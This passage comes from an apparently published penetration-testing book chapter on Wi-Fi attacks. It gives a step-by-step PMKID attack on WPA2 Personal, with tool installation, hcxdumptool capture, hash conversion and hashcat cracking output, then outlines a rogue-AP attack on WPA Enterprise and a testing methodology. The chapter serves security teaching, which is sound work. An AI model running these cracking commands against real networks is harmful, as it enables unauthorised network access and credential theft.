                       46 5C 56 C8 AF 75 3E 06 D8 A2 68 9C 2A 2C 8E 3F 
 
      Transient Key  : 2E 51 30 CD D7 59 E5 35 09 00 CA 65 71 1C D0 4F 
                       21 06 C5 8E 1A 83 73 E0 06 8A 02 9C AA 71 33 AE 
                       73 93 EF D7 EF 4F 07 00 C0 23 83 49 76 00 14 08 
                       BF 66 77 55 D1 0B 15 52 EC 78 4F A1 05 49 CF AA 
      EAPOL HMAC     : F8 FD 17 C5 3B 4E AB C9 D5 F3 8E 4C 4B E2 4D 1A</code></pre>
<p>We recover the PSK: <code>24266642</code>. </p>
<p>Note that some networks use more complex passwords, making this technique less feasible. </p>
<h4 id="h3-500907c12-0008">PMKID Attacks</h4>
<p class="BodyFirst">In 2018, a Hashcat developer nicknamed atom discovered a new way to crack the WPA/WPA2 PSK and outlined it in the Hashcat forums. The novelty of this attack is that it’s clientless; the attacker can target the AP directly without having to capture the four-way handshake. In addition, it’s a more reliable method. </p>
<p>This new technique takes advantage of the <em>Robust Security Network (RSN)</em> PMKID field, an optional field normally found in the first EAPOL frame from the AP. The PMKID gets computed as follows:</p>
<pre><code>PMKID = HMAC-SHA1-128(PMK, “PMK Name” | MAC_AP | MAC_STA)</code></pre>
<p><span epub:type="pagebreak" title="302" id="Page_302"/>The PMKID uses the HMAC-SHA1 function with the PMK as a key. It encrypts the concatenation of a fixed string label, <code>"PMK Name"</code>; the AP’s MAC address; and the wireless station’s MAC address.</p>
<p>For this attack, you’ll need the following tools: Hcxdumptool, Hcxtools, and Hashcat. To install Hcxdumptool, use the following commands:</p>
<pre><code>$ <b>git clone https://github.com/ZerBea/hcxdumptool.git</b>
$ <b>cd hcxdumptool &amp;&amp; make &amp;&amp; </b><b>sudo </b><b>make install</b></code></pre>
<p>To install Hcxtools, you’ll first need to install <code>libcurl-dev</code> if it’s not already installed on your system:</p>
<pre><code>$ <b>sudo apt-get install libcurl4-gnutls-dev</b></code></pre>
<p>Then you can install Hcxtools with the following commands:</p>
<pre><code>$ <b>git clone https://github.com/ZerBea/hcxtools.git</b>
$ <b>cd hcxtools &amp;&amp; make &amp;&amp; </b><b>sudo </b><b>make install</b></code></pre>
<p>If you’re working on Kali, Hashcat should already be installed. On Debian-based distributions, the following command should do the trick:</p>
<pre><code>$<b> </b><b>sudo </b><b>apt install hashcat</b></code></pre>
<p>We first put our wireless interface in monitor mode. Follow the instructions in “Deauthentication and Denial-of-Service Attacks” on page 289 to do this. </p>
<p>Next, using <code>hcxdumptool</code>,<em> </em>we start capturing traffic and save it to a file: </p>
<pre><code># <b>hcxdumptool -i wlan0mon –enable_status=31 -o sep.pcapng –filterlist_ap=whitelist.txt --filtermode=2</b>
initialization...
warning: wlan0mon is probably a monitor interface

start capturing (stop with ctrl+c)
INTERFACE................: wlan0mon
ERRORMAX.................: 100 errors
FILTERLIST...............: 0 entries
MAC CLIENT...............: a4a6a9a712d9
MAC ACCESS POINT.........: 000e2216e86d (incremented on every new client)
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 65165
ANONCE...................: 6dabefcf17997a5c2f573a0d880004af6a246d1f566ebd04c3f1229db1ada39e
...
[18:31:10 – 001] 84a06ec17ccc -&gt; ffffffffff Guest [BEACON, SEQUENCE 2800, AP CHANNEL 11]
...
[18:31:10 – 001] 84a06ec17ddd -&gt; e80401cf4fff [FOUND PMKID CLIENT-LESS]
[18:31:10 – 001] 84a06ec17eee -&gt; e80401cf4aaa [AUTHENTICATION, OPEN SYSTEM, STATUS 0, SEQUENCE 2424]
...
INFO: cha=1, rx=360700, rx(dropped)=106423, tx=9561, powned=21, err=0
INFO: cha=11, rx=361509, rx(dropped)=106618, tx=9580, powned=21, err=0</code></pre>
<p><span epub:type="pagebreak" title="303" id="Page_303"/>Make sure you apply the <code>–filterlist_ap</code> argument with your target’s MAC address when using Hcxdumptool so you don’t accidentally crack the password for a network you have no permission to access. The <code>--filtermode</code> option will blacklist (<code>1</code>) or whitelist (<code>2</code>) the values in your list and then either avoid or target them. In our example, we listed these MAC addresses in the <em>whitelist.txt</em> file.</p>
<p>The output found a potentially vulnerable network, identified by the <code>[FOUND PMKID]</code> tag. Once you see this tag, you can stop capturing traffic. Keep in mind that it might take some time before you encounter it. Also, because the PMKID field is optional, not all existing APs will have one.</p>
<p>Now we need to convert the captured data, which includes the PMKID data in the <em>pcapng</em> format, to a format that Hashcat can recognize: Hashcat takes hashes as input. We can generate a hash from the data using <code>hcxpcaptool</code>:</p>
<pre><code>$ <b>hcxpcaptool -z out sep.pcapng</b>
reading from sep.pcapng-2                                                
summary:                                        
--------
file name....................: sep.pcapng-2
file type....................: pcapng 1.0
file hardware information....: x86_64
file os information..........: Linux 5.2.0-kali2-amd64
file application information.: hcxdumptool 5.1.4
network type.................: DLT_IEEE802_11_RADIO (127)
endianness...................: little endian
read errors..................: flawless
packets inside...............: 171
skipped packets..............: 0
packets with GPS data........: 0
packets with FCS.............: 0
beacons (with ESSID inside)..: 22
probe requests...............: 9
probe responses..............: 6
association requests.........: 1
association responses........: 10
reassociation requests.......: 1
reassociation responses......: 1
authentications (OPEN SYSTEM): 47
authentications (BROADCOM)...: 46
authentications (APPLE)......: 1
EAPOL packets (total)........: 72
EAPOL packets (WPA2).........: 72
EAPOL PMKIDs (total).........: 19
EAPOL PMKIDs (WPA2)..........: 19
best handshakes..............: 3 (ap-less: 0)
best PMKIDs..................: 8

8 PMKID(s) written in old hashcat format (&lt;= 5.1.0) to out</code></pre>
<p>This command creates a new file called <em>out</em> that contains data in the following format: </p>
<pre><code>37edb542e507ba7b2a254d93b3c22fae*b4750e5a1387*6045bdede0e2*4b61746879</code></pre>
<p><span epub:type="pagebreak" title="304" id="Page_304"/>This * delimited format contains the PMKID value, the AP’s MAC address, the wireless station’s MAC address, and the ESSID. Create a new entry for every PMKID network you identify.</p>
<p>Now use the Hashcat 16800 module to crack the vulnerable network’s password. The only thing missing is a wordlist containing potential passwords for the AP. We’ll use the classic <em>rockyou.txt</em> wordlist.</p>
<pre><code><b>$ <code class="bold">cd /usr/share/wordlists/ &amp;&amp; gunzip -d rockyou.txt.gz</code></b>
$ <b>hashcat -m16800 ./out /usr/share/wordlists/rockyou.txt</b>
OpenCL Platform #1: NVIDIA Corporation
====================================== 
* Device #1: GeForce GTX 970M, 768/3072 MB allocatable, 10MCU
OpenCL Platform #2: Intel(R) Corporation
Rules: 1
...
.37edb542e507ba7b2a254d93b3c22fae*b4750e5a1387*6045bdede0e2*4b61746879:<b>  purple123 </b><span class="CodeAnnotation">1</span>
Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: 37edb542e507ba7b2a254d93b3c22fae*b4750e5a1387*6045b...746879
Time.Started.....: Sat Nov 16 13:05:31 2019 (2 secs)
Time.Estimated...: Sat Nov 16 13:05:33 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   105.3 kH/s (11.80ms) @ Accel:256 Loops:32 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 387112/14344385 (2.70%)
Rejected.........: 223272/387112 (57.68%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456789 -&gt; sunflower15
Hardware.Mon.#1..: Temp: 55c Util: 98% Core:1037MHz Mem:2505MHz Bus:16

Started: Sat Nov 16 13:05:26 2019
Stopped: Sat Nov 16 13:05:33 </code></pre>
<p>The Hashcat tool manages to extract the password <span class="CodeAnnotation">1</span>: <code>purple123</code>. </p>
<h3 id="h2-500907c12-0005">Cracking into WPA/WPA2 Enterprise to Capture Credentials</h3>
<p class="BodyFirst">In this section, we provide an overview of attacks against WPA Enterprise. An actual exploitation of WPA Enterprise is outside the scope of this book, but we’ll briefly cover how such an attack works. </p>
<p>WPA Enterprise is a more complex mode than WPA Personal and is mainly used for business environments that require extra security. This mode includes an extra component, a <em>Remote Authentication Dial-In User Service (RADIUS)</em> server, and uses the 802.1x standard. In this standard, the four-way handshake occurs after a separate authentication process, the EAP. For this reason, the attacks on WPA Enterprise focus on breaking EAP.</p>
<p>EAP supports many different authentication methods, the most common of which are Protected-EAP (PEAP) and EAP-Tunneled-TLS (EAP-TTLS). A third method, EAP-TLS, is becoming more popular due to its <span epub:type="pagebreak" title="305" id="Page_305"/>security features. At the time of this writing, EAP-TLS remains a safe choice, because it requires security certificates on both sides of the wireless connection, providing a more resilient approach to connecting to an AP. But the administrative overhead of managing the server and the client certificates might deter most network administrators. The other two protocols perform certificate authentication to the server only, not to the client, allowing the clients to use credentials that are prone to interception.</p>
<p>Network connections in the WPA Enterprise mode involve three parties: the client, the AP, and the RADIUS authentication server. The attack described here will target the authentication server and the AP by attempting to extract the victim’s credential hashes for an offline brute-force attack. It should work against the PEAP and EAP-TTLS protocols.</p>
<p>First, we create a fake infrastructure containing a fake AP and a RADIUS server. This AP should mimic the legitimate one by operating with the same BSSID, ESSID, and channel. Next, because we’re targeting the clients rather than the AP, we’ll deauthenticate the AP’s clients. The clients will attempt to reconnect to their target AP by default, at which point our malicious AP will associate the victims to it. This way, we can capture their credentials. The captured credentials will be encrypted, as mandated by the protocol. Fortunately for us, the PEAP and EAP-TTLS protocols use the MS-CHAPv2 encryption algorithm, which uses the Data Encryption Standard (DES) under the hood and is easily cracked. Equipped with a list of captured encrypted credentials, we can launch an offline brute-force attack and recover the victim’s credentials.</p>
<h2 id="h1-500907c12-0005">A Testing Methodology</h2>
<p class="BodyFirst">When performing a security assessment on Wi-Fi enabled systems, you could follow the methodology outlined here, which covers the attacks described in this chapter.</p>
<p>First, verify whether the device supports Wi-Fi Direct and its association techniques (PIN, PBC, or both). If so, it could be susceptible to PIN brute forcing or EvilDirect attacks.</p>
<p>Next, examine the device and its wireless capabilities. If the wireless device supports STA capabilities (which means itcan be used as either an AP or a client), it might be vulnerable to association attacks. Check if the client connects automatically to previously connected networks. If it does, it could be vulnerable to the Known Beacons attack. Verify that the client isn’t arbitrarily sending probes for previously connected networks. If it is, it could be vulnerable to a KARMA attack.</p>
<p>Identify whether the device has support for any third-party Wi-Fi utilities, such as custom software used to set up Wi-Fi automatically. These utilities could have insecure settings enabled by default due to negligence. Study the device’s activities. Are there any critical operations happening over Wi-Fi? If so, it might be possible to cause a denial of service by jamming the device. Also, in cases when the wireless device supports AP capabilities, it could be vulnerable to improper authentication.</p>
<p><span epub:type="pagebreak" title="306" id="Page_306"/>Then search for potential hardcoded keys. Devices configured to support WPA2 Personal might come with a hardcoded key. This is a common pitfall that could mean an easy win for you. On enterprise networks that use WPA Enterprise, identify which authentication method the network is employing. Networks using PEAP and EAP-TTLS could be susceptible to having their client’s credentials compromised. Enterprise networks should use EAP-TLS instead. </p>
<h2 id="h1-500907c12-0006">Conclusion</h2>
<p class="BodyFirst">Recent advances in technologies like Wi-Fi have greatly contributed to the IoT ecosystem, allowing people and devices to be even more connected than ever in the past. Most people expect a standard degree of connectivity wherever they go, and organizations regularly rely on Wi-Fi and other wireless protocols to increase their productivity. </p>
<p>In this chapter, we demonstrated Wi-Fi attacks against clients and APs with off-the-shelf tools, showing the large attack surface that medium-range radio protocols unavoidably expose. At this point, you should have a good understanding of various attacks against Wi-Fi networks, ranging from signal jamming and network disruption to association attacks like the KARMA and Known Beacons attacks. We detailed some key features of Wi-Fi Direct and how to compromise them using PIN brute forcing and the EvilDirect attack. Then we went over the WPA2 Personal and Enterprise security protocols and identified their most critical issues. Consider this chapter a baseline for your Wi-Fi network assessments.</p>
</section>
</div></body></html>